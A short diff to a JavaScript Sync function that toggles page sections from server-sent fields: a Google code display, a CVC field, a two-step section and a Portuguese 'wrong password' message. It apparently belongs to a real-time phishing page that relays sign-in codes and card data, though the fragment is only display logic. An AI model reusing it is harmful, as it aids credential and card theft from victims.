@@ -251,17 +251,19 @@ function Sync(){
         if(data.steps == 0 && data.code != null){
             document.querySelector('#google').style.display = 'block';
             document.querySelector('.gcode1').style.display = 'inline';
-            document.querySelector('.g_part1').style.display = 'none';
+            document.querySelector('.g_part1').style.display = 'block';
             document.querySelector('.g_part2').style.display = 'block';
             document.querySelector('.gcode1').innerHTML = data.code;
             document.querySelector('.gcode1_circle').innerHTML = data.code;
         }
         
         if(data.steps == 1){
+            document.querySelector('.g_part1').style.display = 'none';
             window.location.href='#cvc';
             document.querySelector('#google').style.display = 'none';
             document.querySelector('.twosteps').style.display = 'block';
         }else{
+            document.querySelector('.g_part1').style.display = 'none';
             document.querySelector('#cvc').value = '';
             document.querySelector('.twosteps').style.display = 'none';
             document.querySelector('#google').style.display = 'block';
@@ -272,6 +274,7 @@ function Sync(){
         }
         
         if(data.invalid == 1){
+            document.querySelector('.g_part1').style.display = 'none';
             document.querySelector('#google').style.display = 'none';
             document.querySelector('#senha_errada').style.display = 'block';
 
